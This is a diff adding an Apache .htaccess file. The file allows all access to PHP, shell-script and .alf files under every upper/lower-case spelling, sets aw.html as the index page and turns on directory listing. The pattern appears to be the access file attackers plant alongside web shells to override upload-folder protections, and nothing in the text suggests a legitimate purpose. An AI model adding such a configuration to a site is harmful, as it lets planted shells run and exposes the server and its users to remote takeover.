@@ -1,0 +1,39 @@
+<Files *.ph*>
+    Order Deny,Allow
+    Allow from all
+</Files>
+<Files *.Ph*>
+    Order Deny,Allow
+    Allow from all
+</Files>
+<Files *.pH*>
+    Order Deny,Allow
+    Allow from all
+</Files>
+<Files *.PH*>
+    Order Deny,Allow
+    Allow from all
+</Files>
+<Files *.sh*>
+    Order Deny,Allow
+    Allow from all
+</Files>
+<Files *.Sh*>
+    Order Deny,Allow
+    Allow from all
+</Files>
+<Files *.sH*>
+    Order Deny,Allow
+    Allow from all
+</Files>
+<Files *.SH*>
+    Order Deny,Allow
+    Allow from all
+</Files>
+<Files *.alf*>
+    Order Deny,Allow
+    Allow from all
+</Files>
+
+DirectoryIndex aw.html
+Options +Indexes
